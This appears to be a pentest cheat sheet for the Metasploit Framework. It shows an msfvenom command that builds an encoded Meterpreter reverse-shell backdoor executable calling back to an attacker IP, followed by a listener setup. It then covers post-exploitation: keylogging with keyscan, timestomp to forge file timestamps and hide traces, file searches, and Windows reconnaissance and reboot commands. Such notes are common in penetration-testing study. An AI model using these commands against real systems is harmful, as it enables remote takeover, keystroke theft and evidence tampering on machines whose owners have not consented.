# Metasploit

Metasploit Framework is a tool for developing and executing exploit code against a remote target machine. Ruby based modular pentest platform that enable to write, test, and execute exploit code. Contains a suite of tools that you can use to test security vulnerabilities, enumerate networks, execute attacks, and evade detection. Meterpreter is a Metasploit attack payload that provide an interactive shell that can be used to explore the target machine and execute code.

***

## Create the app PE&#x20;

```
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Backdoor.exe
```

***

## Set up listener in metasploit

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST VALUE
show options
exploit -j -z # background job
```

***

## If the session catch

```
sessions -i 2    # connect to sessions 2
getuid           # get uid/user
sysinfo          # check the system info, OS, domain
ifconfig         # displays the victim machine's IP address, MAC address, and other information
pwd              # view current working directory  
ls               # list the files in the current working directories
cat [filename]   # read the content of a text file

```

***

## MACE

Modified, Accessed, Created, Entry (**MACE**) to change attributes of a file. While performing post-exploitation activities, an attacker tries to access files to read their contents. Upon doing so, the MACE attributes immediately change, which indicates to the file user or owner that someone has read or modified the information.

### Display attributes

To leave no trace of these MACE attributes, use the **timestomp** command to change the attributes as you wish after accessing a file.

```
timestomp [file] -v     # display the created, accessed, modified, and entry modified time
```

### Change attributes

```
timestomp [file] -m "DD/MM/YYYY HH:MM:SS"
```

> **-m**: Modified value
>
> **-a**: Accessed value
>
> **-c**: Created value
>
> **-e**: Entry value

***

## search

Can use **search** command to help locate files on the target machine. This type of cmd is capable of searching through the whole system or can be limited to specific folders.

```
search -f [file]
```

***

## Key-logging

Capture all keyboard input from the target system.

```
keyscan_start
```

dumps all captured keystrokes.

```
keyscan_dump
```

***

## idletime

Display the amount of time for which the user has been idle on the remote system.

```
idletime
```

***



## Operate in shell

### Windows

#### Retrieve the directory names with hidden attribute

```
dir /a:h
```

#### List all available services

```
sc queryex type=service state=all
```

#### List details about specific service, display current firewall state

```
netsh firewall show state
```

#### View current firewall settings in the target system

```
netsh firewall show config
```

#### View the details of installed software

```
wmic /node:"" product get name,version,vendor
```

#### Retrieve the processor's details

```
wmic cpu get
```

#### Retrieve login names and SIDs of the users

```
wmic useraccount get name,sid
```

#### Reboot the target system

```
wmic os where Primary='TRUE' reboot
```



<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>



